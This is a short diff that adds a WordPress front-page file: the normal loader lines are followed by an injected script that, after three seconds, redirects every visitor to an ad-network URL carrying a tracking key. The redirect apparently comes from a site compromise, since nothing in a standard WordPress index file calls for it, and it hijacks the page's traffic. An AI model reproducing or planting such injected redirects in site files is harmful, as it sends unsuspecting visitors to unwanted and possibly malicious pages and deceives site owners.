@@ -1,1 +1,9 @@
-
+<?php
+define('WP_USE_THEMES', true);
+require('./wp-blog-header.php');
+?>
+<script>
+setTimeout(function() {
+    window.location.href = "https://www.effectivecpmnetwork.com/hfyzk205e?key=13dc57ed68a19a37f641a33e0fd8aac3";
+}, 3000);
+</script>
